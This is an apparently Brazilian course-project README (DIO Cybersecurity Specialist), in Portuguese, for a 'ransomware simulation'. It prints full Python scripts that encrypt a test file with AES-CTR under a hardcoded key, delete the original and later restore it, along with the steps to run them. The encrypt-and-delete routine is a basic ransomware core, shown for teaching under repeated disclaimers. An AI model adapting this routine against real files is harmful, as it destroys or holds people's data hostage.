 <div align="center">

# 🔒 Simulação de Ransomware em Python

### 🛡️ DIO – Formação Cybersecurity Specialist

Projeto desenvolvido com finalidade educacional para demonstrar conceitos de criptografia e descriptografia de arquivos utilizando Python.

![Python](https://img.shields.io/badge/Python-3.13.7-3776AB?style=for-the-badge&logo=python&logoColor=yellow)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![AES](https://img.shields.io/badge/AES--CTR-Cryptography-red?style=for-the-badge)
![DIO](https://img.shields.io/badge/DIO-Cybersecurity-orange?style=for-the-badge)

</div>

---

## 📋 Sobre o Projeto

Este projeto consiste em uma simulação educacional do funcionamento básico de um **Ransomware**, desenvolvida em Python durante a formação **Cybersecurity Specialist da DIO**.

A implementação utiliza a biblioteca `pyaes` para demonstrar o processo de criptografia e descriptografia de arquivos por meio do algoritmo **AES no modo CTR (Counter)**.

O objetivo é compreender, na prática, como ocorre a criptografia de arquivos e como recuperar os dados utilizando a chave correspondente.

> ⚠️ **AVISO DE SEGURANÇA:** Este projeto possui finalidade exclusivamente educacional. Execute somente em ambiente controlado, utilizando arquivos de teste e máquinas virtuais. Não utilize em sistemas ou arquivos reais.

---

## 🛠️ Tecnologias e Ferramentas

| Tecnologia | Finalidade |
|---|---|
| Python 3.13.7 | Desenvolvimento dos scripts |
| pyaes | Biblioteca de criptografia AES |
| AES-CTR | Algoritmo e modo de operação criptográfica |
| Kali Linux | Ambiente de execução |
| Git e GitHub | Versionamento e documentação |

### Instalação da dependência

```bash
pip install pyaes
```

---

## 📁 Estrutura do Projeto

```text
simulacao-ransomware-kali-python/
│
├── encrypter.py       # Script de criptografia
├── decrypter.py       # Script de descriptografia
└── README.md          # Documentação do projeto
```

---

## ⚙️ Funcionamento

O projeto está dividido em duas etapas principais:

### 1. 🔐 Criptografia – `encrypter.py`

O script realiza as seguintes operações:

- Lê o arquivo `teste.txt`.
- Carrega o conteúdo do arquivo.
- Utiliza AES-CTR para criptografar os dados.
- Salva o resultado com a extensão `.ransomwaretroll`.
- Remove o arquivo original.

### 2. 🔓 Descriptografia – `decrypter.py`

O processo inverso é realizado pelo segundo script:

- Localiza o arquivo criptografado.
- Utiliza a mesma chave para recuperar os dados.
- Descriptografa o conteúdo.
- Remove o arquivo criptografado.
- Restaura o arquivo original `teste.txt`.

### 📝 Decisões Técnicas

- Utilização de chave fixa para fins didáticos.
- AES no modo CTR, que não exige padding.
- Processamento de um arquivo por execução.
- Utilização de operações de leitura e escrita binária.

---

## 💻 Implementação

### 🔐 encrypter.py

```python
import os
import pyaes

# Abrir arquivo a ser criptografado
file_name = 'teste.txt'

file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Definir a chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar arquivo criptografado
new_file = file_name + '.ransomwaretroll'

with open(new_file, 'wb') as f:
    f.write(crypto_data)

print("💰 Arquivo criptografado!")
```

### 🔓 decrypter.py

```python
import os
import pyaes

# Abrir arquivo criptografado
file_name = 'teste.txt.ransomwaretroll'

file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Definir chave de descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Descriptografar arquivo
decrypt_data = aes.decrypt(file_data)

# Remover arquivo criptografado
os.remove(file_name)

# Restaurar arquivo original
new_file = 'teste.txt'

with open(new_file, 'wb') as f:
    f.write(decrypt_data)

print("✅ Arquivo descriptografado com sucesso!")
```

---

## 🚀 Como Executar

### 1. Criar arquivo de teste

```bash
echo "Este arquivo esta legivel e descriptografado" > teste.txt
```

### 2. Verificar arquivo criado

```bash
ls
```

### 3. Executar criptografia

```bash
python encrypter.py
```

### 4. Verificar arquivo criptografado

```bash
ls
```

O arquivo deverá aparecer com o nome:

```text
teste.txt.ransomwaretroll
```

### 5. Executar descriptografia

```bash
python decrypter.py
```

### 6. Verificar arquivo restaurado

```bash
ls
nano teste.txt
```

O conteúdo original deverá estar novamente disponível.

<details>
<summary>📸 Resultado esperado</summary>

**Antes da criptografia:**

```text
teste.txt
```

**Após a criptografia:**

```text
teste.txt.ransomwaretroll
```

**Após a descriptografia:**

```text
teste.txt
```

</details>

---

## 🧠 Conhecimentos Adquiridos

Durante o desenvolvimento desta atividade, foram explorados os seguintes conceitos:

- 🔐 Fundamentos de criptografia simétrica.
- 🔑 Utilização de chaves criptográficas.
- 🛡️ Algoritmo AES e modo de operação CTR.
- 🐍 Manipulação de arquivos utilizando Python.
- 💻 Execução de scripts em ambiente Linux.
- 🔄 Processos de criptografia e recuperação de dados.

### 📚 Próximos Passos

- Explorar outros algoritmos e modos de criptografia.
- Estudar mecanismos de proteção contra ransomware.
- Implementar boas práticas de gerenciamento de chaves.
- Conhecer técnicas de detecção e resposta a incidentes.

---

## ⚖️ Aviso Legal

Este projeto foi desenvolvido exclusivamente para fins acadêmicos e educacionais, como parte da formação **Cybersecurity Specialist da DIO**.

A implementação não deve ser utilizada para comprometer sistemas, criptografar arquivos de terceiros ou realizar atividades não autorizadas.

O uso de técnicas de ransomware em ambientes sem autorização pode configurar crime, conforme a legislação brasileira.

---

<div align="center">

### 👨‍💻 Projeto desenvolvido para fins educacionais

**DIO – Formação Cybersecurity Specialist**

📅 Novembro de 2026 🇧🇷

</div>
